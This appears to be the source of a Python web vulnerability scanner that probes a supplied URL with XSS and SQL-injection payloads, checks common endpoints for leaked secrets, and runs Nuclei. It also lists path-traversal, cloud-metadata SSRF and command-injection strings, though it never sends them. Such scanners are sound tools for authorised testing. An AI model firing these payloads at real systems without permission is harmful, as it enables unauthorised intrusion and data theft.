#!/usr/bin/env python3
"""
AEGIS-X Focused - Fast and Effective Vulnerability Scanner
Focused on finding real vulnerabilities quickly
"""

import asyncio
import aiohttp
import logging
import json
import time
import os
import re
import urllib.parse
import subprocess
from pathlib import Path
from typing import Dict, List, Any, Optional
from datetime import datetime
from dataclasses import dataclass, asdict
import argparse

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/aegis_x_focused.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

@dataclass
class Vulnerability:
    """Vulnerability representation"""
    id: str
    type: str
    severity: str
    url: str
    title: str
    description: str
    payload: str
    proof_of_concept: str
    impact: str
    remediation: str
    confidence: float
    verified: bool
    timestamp: str

class FocusedVulnerabilityScanner:
    """Fast, focused vulnerability scanner"""
    
    def __init__(self):
        self.session = None
        self.vulnerabilities = []
        self.target_info = {}
        
        # High-impact payloads that are most likely to work
        self.xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
        ]
        
        self.sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "admin'--",
            "' UNION SELECT NULL--",
            "1' AND SLEEP(5)--",
        ]
        
        self.lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "php://filter/read=convert.base64-encode/resource=index.php",
        ]
        
        self.ssrf_payloads = [
            "http://127.0.0.1:80",
            "http://localhost:80",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
        ]
        
        self.rce_payloads = [
            "; id",
            "| id",
            "`id`",
            "$(id)",
        ]
        
        # Common vulnerable parameters
        self.common_params = [
            'id', 'user', 'page', 'file', 'path', 'url', 'redirect', 'q', 'search',
            'query', 'name', 'email', 'username', 'cmd', 'command', 'exec'
        ]
        
        # Common vulnerable endpoints
        self.common_endpoints = [
            '/admin', '/login', '/search', '/user', '/profile', '/api', '/upload',
            '/download', '/file', '/image', '/doc', '/pdf', '/test', '/debug'
        ]
    
    async def initialize(self):
        """Initialize the scanner"""
        logger.info("🔥 Initializing AEGIS-X Focused Scanner")
        
        os.makedirs("logs", exist_ok=True)
        os.makedirs("output", exist_ok=True)
        
        timeout = aiohttp.ClientTimeout(total=10)  # Shorter timeout
        connector = aiohttp.TCPConnector(limit=50, limit_per_host=5)
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        )
        
        logger.info("✅ Scanner initialized")
    
    async def scan_target(self, target: str) -> List[Vulnerability]:
        """Fast vulnerability scan"""
        logger.info(f"🎯 Starting focused scan for: {target}")
        
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        
        vulnerabilities = []
        
        try:
            # Quick info gathering
            await self._quick_info_gathering(target)
            
            # Test main target with common parameters
            logger.info("⚡ Testing main target")
            main_vulns = await self._test_target_with_params(target)
            vulnerabilities.extend(main_vulns)
            
            # Test common endpoints
            logger.info("📁 Testing common endpoints")
            endpoint_vulns = await self._test_common_endpoints(target)
            vulnerabilities.extend(endpoint_vulns)
            
            # Quick Nuclei scan
            logger.info("🚀 Running focused Nuclei scan")
            nuclei_vulns = await self._run_focused_nuclei(target)
            vulnerabilities.extend(nuclei_vulns)
            
            logger.info(f"🎉 Scan complete! Found {len(vulnerabilities)} vulnerabilities")
            
            return vulnerabilities
            
        except Exception as e:
            logger.error(f"❌ Scan failed: {str(e)}")
            return []
    
    async def _quick_info_gathering(self, target: str):
        """Quick information gathering"""
        try:
            async with self.session.get(target) as response:
                self.target_info = {
                    'status_code': response.status,
                    'server': response.headers.get('Server', 'Unknown'),
                    'powered_by': response.headers.get('X-Powered-By', 'Unknown'),
                }
                
                # Check for missing security headers
                security_headers = ['X-Frame-Options', 'X-XSS-Protection', 'X-Content-Type-Options']
                missing_headers = [h for h in security_headers if h not in response.headers]
                
                if missing_headers:
                    vuln = Vulnerability(
                        id=f"missing_headers_{int(time.time())}",
                        type="Security Headers",
                        severity="Low",
                        url=target,
                        title="Missing Security Headers",
                        description=f"Missing: {', '.join(missing_headers)}",
                        payload="N/A",
                        proof_of_concept=f"curl -I {target}",
                        impact="Potential security risks",
                        remediation="Implement missing security headers",
                        confidence=0.9,
                        verified=True,
                        timestamp=datetime.now().isoformat()
                    )
                    self.vulnerabilities.append(vuln)
                
                logger.info(f"📊 Target: {response.status} {self.target_info['server']}")
                
        except Exception as e:
            logger.error(f"❌ Info gathering failed: {str(e)}")
    
    async def _test_target_with_params(self, target: str) -> List[Vulnerability]:
        """Test target with common parameters"""
        vulnerabilities = []
        
        for param in self.common_params[:8]:  # Test top 8 parameters
            # Test XSS
            for payload in self.xss_payloads[:3]:  # Top 3 XSS payloads
                try:
                    test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
                    async with self.session.get(test_url) as response:
                        if response.status == 200:
                            content = await response.text()
                            if payload in content:
                                vuln = Vulnerability(
                                    id=f"xss_{param}_{int(time.time())}",
                                    type="Cross-Site Scripting (XSS)",
                                    severity="Medium",
                                    url=test_url,
                                    title=f"XSS in parameter '{param}'",
                                    description=f"XSS payload reflected in parameter '{param}'",
                                    payload=payload,
                                    proof_of_concept=f"Visit: {test_url}",
                                    impact="Session hijacking, data theft possible",
                                    remediation="Implement input validation and output encoding",
                                    confidence=0.8,
                                    verified=False,
                                    timestamp=datetime.now().isoformat()
                                )
                                vulnerabilities.append(vuln)
                                logger.info(f"🚨 XSS found: {param}")
                                break
                    
                    await asyncio.sleep(0.1)
                except Exception:
                    continue
            
            # Test SQLi
            for payload in self.sqli_payloads[:3]:  # Top 3 SQLi payloads
                try:
                    test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
                    
                    start_time = time.time()
                    async with self.session.get(test_url) as response:
                        end_time = time.time()
                        content = await response.text()
                        response_time = end_time - start_time
                        
                        # Check for SQL errors
                        sql_errors = ['mysql_fetch_array', 'ORA-01756', 'Microsoft OLE DB Provider', 'PostgreSQL query failed']
                        error_found = any(error.lower() in content.lower() for error in sql_errors)
                        
                        # Check for time-based SQLi
                        time_delay = 'SLEEP' in payload.upper() and response_time > 4
                        
                        if error_found or time_delay:
                            vuln = Vulnerability(
                                id=f"sqli_{param}_{int(time.time())}",
                                type="SQL Injection",
                                severity="High",
                                url=test_url,
                                title=f"SQL Injection in parameter '{param}'",
                                description=f"SQL injection detected in parameter '{param}'",
                                payload=payload,
                                proof_of_concept=f"Visit: {test_url}",
                                impact="Database access, data extraction possible",
                                remediation="Use parameterized queries",
                                confidence=0.9 if error_found else 0.7,
                                verified=False,
                                timestamp=datetime.now().isoformat()
                            )
                            vulnerabilities.append(vuln)
                            logger.info(f"🚨 SQLi found: {param}")
                            break
                    
                    await asyncio.sleep(0.1)
                except Exception:
                    continue
        
        return vulnerabilities
    
    async def _test_common_endpoints(self, target: str) -> List[Vulnerability]:
        """Test common endpoints"""
        vulnerabilities = []
        base_url = target.rstrip('/')
        
        for endpoint in self.common_endpoints:
            try:
                test_url = f"{base_url}{endpoint}"
                async with self.session.get(test_url) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # Check for sensitive information exposure
                        sensitive_patterns = [
                            r'password\s*[:=]\s*["\']?[^"\'\s]+',
                            r'api[_-]?key\s*[:=]\s*["\']?[^"\'\s]+',
                            r'secret\s*[:=]\s*["\']?[^"\'\s]+',
                            r'token\s*[:=]\s*["\']?[^"\'\s]+',
                            r'mysql://[^"\'\s]+',
                            r'postgresql://[^"\'\s]+',
                        ]
                        
                        for pattern in sensitive_patterns:
                            if re.search(pattern, content, re.IGNORECASE):
                                vuln = Vulnerability(
                                    id=f"info_disclosure_{endpoint.replace('/', '_')}_{int(time.time())}",
                                    type="Information Disclosure",
                                    severity="Medium",
                                    url=test_url,
                                    title=f"Sensitive Information in {endpoint}",
                                    description=f"Sensitive information found in {endpoint}",
                                    payload="N/A",
                                    proof_of_concept=f"Visit: {test_url}",
                                    impact="Potential credential or configuration exposure",
                                    remediation="Remove sensitive information from public endpoints",
                                    confidence=0.8,
                                    verified=True,
                                    timestamp=datetime.now().isoformat()
                                )
                                vulnerabilities.append(vuln)
                                logger.info(f"🚨 Info disclosure found: {endpoint}")
                                break
                        
                        # Check for admin panels
                        admin_indicators = ['admin', 'dashboard', 'control panel', 'management']
                        if any(indicator in content.lower() for indicator in admin_indicators):
                            vuln = Vulnerability(
                                id=f"admin_panel_{endpoint.replace('/', '_')}_{int(time.time())}",
                                type="Admin Panel Exposure",
                                severity="Low",
                                url=test_url,
                                title=f"Admin Panel Found: {endpoint}",
                                description=f"Admin panel or management interface found at {endpoint}",
                                payload="N/A",
                                proof_of_concept=f"Visit: {test_url}",
                                impact="Potential unauthorized administrative access",
                                remediation="Restrict access to admin panels",
                                confidence=0.7,
                                verified=True,
                                timestamp=datetime.now().isoformat()
                            )
                            vulnerabilities.append(vuln)
                            logger.info(f"🚨 Admin panel found: {endpoint}")
                
                await asyncio.sleep(0.1)
            except Exception:
                continue
        
        return vulnerabilities
    
    async def _run_focused_nuclei(self, target: str) -> List[Vulnerability]:
        """Run focused Nuclei scan"""
        vulnerabilities = []
        
        try:
            # Check if Nuclei is available
            result = subprocess.run(['nuclei', '-version'], capture_output=True, text=True, timeout=5)
            if result.returncode != 0:
                logger.warning("⚠️ Nuclei not available, skipping")
                return []
            
            # Run focused Nuclei scan with high-impact templates
            cmd = [
                'nuclei',
                '-u', target,
                '-t', 'cves/',
                '-t', 'vulnerabilities/',
                '-t', 'exposures/',
                '-json',
                '-silent',
                '-rate-limit', '5',
                '-timeout', '5',
                '-retries', '1'
            ]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=30)
                
                if process.returncode == 0:
                    for line in stdout.decode().strip().split('\n'):
                        if line.strip():
                            try:
                                nuclei_data = json.loads(line)
                                vuln = self._parse_nuclei_result(nuclei_data)
                                vulnerabilities.append(vuln)
                            except json.JSONDecodeError:
                                continue
                    
                    logger.info(f"🚀 Nuclei found {len(vulnerabilities)} vulnerabilities")
                
            except asyncio.TimeoutError:
                process.kill()
                logger.warning("⚠️ Nuclei scan timed out")
                
        except Exception as e:
            logger.error(f"❌ Nuclei scan failed: {str(e)}")
        
        return vulnerabilities
    
    def _parse_nuclei_result(self, nuclei_data: Dict[str, Any]) -> Vulnerability:
        """Parse Nuclei result"""
        info = nuclei_data.get('info', {})
        
        severity_mapping = {
            'info': 'Low',
            'low': 'Low',
            'medium': 'Medium',
            'high': 'High',
            'critical': 'Critical'
        }
        
        severity = severity_mapping.get(info.get('severity', 'low').lower(), 'Low')
        
        return Vulnerability(
            id=f"nuclei_{nuclei_data.get('template-id', 'unknown')}_{int(time.time())}",
            type=info.get('name', 'Nuclei Detection'),
            severity=severity,
            url=nuclei_data.get('matched-at', ''),
            title=info.get('name', 'Nuclei Detection'),
            description=info.get('description', 'Vulnerability detected by Nuclei'),
            payload=nuclei_data.get('extracted-results', ['N/A'])[0] if nuclei_data.get('extracted-results') else 'N/A',
            proof_of_concept=f"Nuclei template: {nuclei_data.get('template-id', 'unknown')}",
            impact=self._get_impact_from_severity(severity),
            remediation=info.get('remediation', 'Follow security best practices'),
            confidence=0.9,
            verified=True,
            timestamp=nuclei_data.get('timestamp', datetime.now().isoformat())
        )
    
    def _get_impact_from_severity(self, severity: str) -> str:
        """Get impact description"""
        impact_map = {
            'Critical': 'Complete system compromise possible',
            'High': 'Significant security risk with potential for data breach',
            'Medium': 'Moderate security risk requiring attention',
            'Low': 'Minor security issue with limited impact'
        }
        return impact_map.get(severity, 'Security vulnerability detected')
    
    async def generate_report(self, vulnerabilities: List[Vulnerability], target: str) -> str:
        """Generate report"""
        timestamp = int(time.time())
        report_file = f"output/aegis_x_focused_report_{target.replace('://', '_').replace('/', '_')}_{timestamp}.json"
        
        # Calculate statistics
        total_vulns = len(vulnerabilities)
        critical_vulns = len([v for v in vulnerabilities if v.severity == "Critical"])
        high_vulns = len([v for v in vulnerabilities if v.severity == "High"])
        medium_vulns = len([v for v in vulnerabilities if v.severity == "Medium"])
        low_vulns = len([v for v in vulnerabilities if v.severity == "Low"])
        verified_vulns = len([v for v in vulnerabilities if v.verified])
        
        report_data = {
            "scan_info": {
                "target": target,
                "timestamp": datetime.now().isoformat(),
                "scanner": "AEGIS-X Focused",
                "version": "1.0"
            },
            "statistics": {
                "total_vulnerabilities": total_vulns,
                "critical": critical_vulns,
                "high": high_vulns,
                "medium": medium_vulns,
                "low": low_vulns,
                "verified": verified_vulns,
                "verification_rate": round(verified_vulns / total_vulns * 100, 2) if total_vulns > 0 else 0
            },
            "target_info": self.target_info,
            "vulnerabilities": [asdict(vuln) for vuln in vulnerabilities]
        }
        
        with open(report_file, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        # Print summary
        logger.info("=" * 60)
        logger.info("🎯 AEGIS-X FOCUSED SCAN RESULTS")
        logger.info("=" * 60)
        logger.info(f"Target: {target}")
        logger.info(f"Total Vulnerabilities: {total_vulns}")
        logger.info(f"Critical: {critical_vulns}")
        logger.info(f"High: {high_vulns}")
        logger.info(f"Medium: {medium_vulns}")
        logger.info(f"Low: {low_vulns}")
        logger.info(f"Verified: {verified_vulns} ({round(verified_vulns / total_vulns * 100, 2) if total_vulns > 0 else 0}%)")
        logger.info(f"Report saved: {report_file}")
        logger.info("=" * 60)
        
        return report_file
    
    async def close(self):
        """Clean up"""
        if self.session:
            await self.session.close()

async def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="AEGIS-X Focused - Fast Vulnerability Scanner")
    parser.add_argument("target", help="Target URL to scan")
    parser.add_argument("--timeout", type=int, default=120, help="Scan timeout in seconds")
    
    args = parser.parse_args()
    
    scanner = FocusedVulnerabilityScanner()
    
    try:
        await scanner.initialize()
        
        # Run the scan
        vulnerabilities = await scanner.scan_target(args.target)
        
        # Generate report
        report_file = await scanner.generate_report(vulnerabilities, args.target)
        
        # Success criteria check
        critical_count = len([v for v in vulnerabilities if v.severity == "Critical"])
        high_count = len([v for v in vulnerabilities if v.severity == "High"])
        medium_count = len([v for v in vulnerabilities if v.severity == "Medium"])
        total_count = len(vulnerabilities)
        
        logger.info("🎯 Checking Success Criteria:")
        logger.info(f"✅ Total Vulnerabilities: {total_count}")
        logger.info(f"✅ Critical: {critical_count}")
        logger.info(f"✅ High: {high_count}")
        logger.info(f"✅ Medium: {medium_count}")
        
        if total_count > 0:
            logger.info("🎉 SUCCESS: Vulnerabilities found!")
        else:
            logger.info("⚠️ No vulnerabilities found - target may be well secured")
        
    except KeyboardInterrupt:
        logger.info("🛑 Scan interrupted by user")
    except Exception as e:
        logger.error(f"❌ Scan failed: {str(e)}")
    finally:
        await scanner.close()

if __name__ == "__main__":
    asyncio.run(main())